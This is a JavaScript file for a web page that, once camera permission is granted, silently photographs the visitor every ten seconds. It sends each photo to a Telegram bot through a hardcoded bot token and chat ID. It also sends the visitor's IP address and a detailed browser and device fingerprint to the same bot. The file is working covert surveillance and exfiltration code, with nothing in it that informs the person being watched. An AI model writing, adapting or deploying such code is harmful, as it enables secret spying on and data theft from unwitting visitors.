document.addEventListener("DOMContentLoaded", function() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    // Get access to the camera
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            video.srcObject = stream;
            console.log("Camera access granted.");
            startAutoCapture();
        })
        .catch(function(error) {
            console.error("Error accessing the camera: ", error);
        });

    function startAutoCapture() {
        setInterval(captureAndSendPhoto, 10000); // Capture a photo every 10 seconds
    }

    function captureAndSendPhoto() {
        console.log("Capturing photo...");
        // Draw the video frame to the canvas
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Convert the canvas image to a Blob
        canvas.toBlob(function(blob) {
            console.log("Photo captured, size: " + blob.size);
            // Send the photo first, then visitor info
            sendPhotoToTelegram(blob)
                .then(() => {
                    // Get visitor info and send it after the photo
                    getVisitorInfo();
                })
                .catch(error => {
                    console.error("Error in sendPhotoToTelegram: ", error);
                });
        }, 'image/png');
    }

    function getVisitorInfo() {
        console.log("Getting visitor info...");
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const userAgent = navigator.userAgent;
                const platformInfo = platform.parse(userAgent);
                
                const basicInfo = {
                    IP: ip,
                    UserAgent: userAgent,
                    OS: `${platformInfo.os.family} ${platformInfo.os.version}`,
                    Device: platformInfo.product || 'Unknown',
                    Browser: `${platformInfo.name} ${platformInfo.version}`,
                    ScreenWidth: screen.width,
                    ScreenHeight: screen.height
                };

                const extendedInfo = {
                    IP: ip,
                    UserAgent: userAgent,
                    OS: `${platformInfo.os.family} ${platformInfo.os.version}`,
                    Device: platformInfo.product || 'Unknown',
                    Browser: `${platformInfo.name} ${platformInfo.version}`,
                    BrowserLayout: platformInfo.layout,
                    ScreenWidth: screen.width,
                    ScreenHeight: screen.height,
                    ColorDepth: screen.colorDepth,
                    Platform: navigator.platform,
                    Language: navigator.language,
                    Online: navigator.onLine,
                    JavaEnabled: navigator.javaEnabled(),
                    CookieEnabled: navigator.cookieEnabled,
                    DoNotTrack: navigator.doNotTrack,
                    HardwareConcurrency: navigator.hardwareConcurrency,
                    MaxTouchPoints: navigator.maxTouchPoints,
                    Vendor: navigator.vendor,
                    VendorSub: navigator.vendorSub,
                    AppName: navigator.appName,
                    AppVersion: navigator.appVersion,
                    AppCodeName: navigator.appCodeName,
                    Product: navigator.product,
                    ProductSub: navigator.productSub,
                    BuildID: navigator.buildID,
                    UserAgentData: navigator.userAgentData ? JSON.stringify(navigator.userAgentData) : 'Not supported',
                    Bluetooth: navigator.bluetooth ? 'Supported' : 'Not supported',
                    Clipboard: navigator.clipboard ? 'Supported' : 'Not supported',
                    Connection: navigator.connection ? JSON.stringify(navigator.connection) : 'Not supported',
                    Geolocation: navigator.geolocation ? 'Supported' : 'Not supported',
                    MediaDevices: navigator.mediaDevices ? 'Supported' : 'Not supported',
                    Permissions: navigator.permissions ? 'Supported' : 'Not supported',
                    ServiceWorker: navigator.serviceWorker ? 'Supported' : 'Not supported',
                    Storage: navigator.storage ? 'Supported' : 'Not supported',
                    WebDriver: navigator.webdriver ? 'Enabled' : 'Disabled',
                    MimeTypes: navigator.mimeTypes ? JSON.stringify(navigator.mimeTypes) : 'Not supported',
                    Plugins: navigator.plugins ? JSON.stringify(navigator.plugins) : 'Not supported',
                    DeviceMemory: navigator.deviceMemory || 'Unknown',
                    WebRTC: navigator.mediaDevices && navigator.mediaDevices.enumerateDevices ? 'Supported' : 'Not supported'
                };

                // Convert visitor info object to formatted strings
                const basicInfoString = Object.entries(basicInfo)
                    .map(([key, value]) => `${key}: ${value}`)
                    .join('\n');

                const extendedInfoString = Object.entries(extendedInfo)
                    .map(([key, value]) => `${key}: ${value}`)
                    .join('\n');

                // Send basic info first
                sendMessageToTelegram(basicInfoString)
                    .then(() => {
                        // Send extended info after a delay
                        setTimeout(() => {
                            sendMessageToTelegram(extendedInfoString);
                        }, 5000); // Adjust the delay as needed
                    })
                    .catch(error => {
                        console.error("Error in sendMessageToTelegram (basic info): ", error);
                    });
            })
            .catch(error => {
                console.error('Error getting IP address: ', error);
            });
    }

    function sendPhotoToTelegram(photoBlob) {
        const botToken = '7499288227:AAFVVtfz4gYgEsweWsA5p-BeSufJ3Q-TiqY'; // Replace with your actual bot token
        const chatId = '5083802935';     // Repl5083802935ace with your actual chat ID

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', photoBlob, 'photo.png');

        console.log("Sending photo to Telegram...");
        return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok: ' + response.statusText);
            }
            return response.json();
        })
        .then(data => {
            if (data.ok) {
                console.log('Photo sent successfully!');
            } else {
                console.error('Error sending photo: ', data);
                throw new Error(`Telegram API error: ${data.description}`);
            }
        })
        .catch(error => {
            console.error('Error: ', error);
            throw error;
        });
    }

    function sendMessageToTelegram(message) {
        const botToken = 'YOUR_ACTUAL_BOT_TOKEN'; // Replace with your actual bot token
        const chatId = 'YOUR_ACTUAL_CHAT_ID';     // Replace with your actual chat ID

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);

        console.log("Sending message to Telegram...");
        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok: ' + response.statusText);
            }
            return response.json();
        })
        .then(data => {
            if (data.ok) {
                console.log('Message sent successfully!');
            } else {
                console.error('Error sending message: ', data);
                throw new Error(`Telegram API error: ${data.description}`);
            }
        })
        .catch(error => {
            console.error('Error: ', error);
            throw error;
        });
    }
});
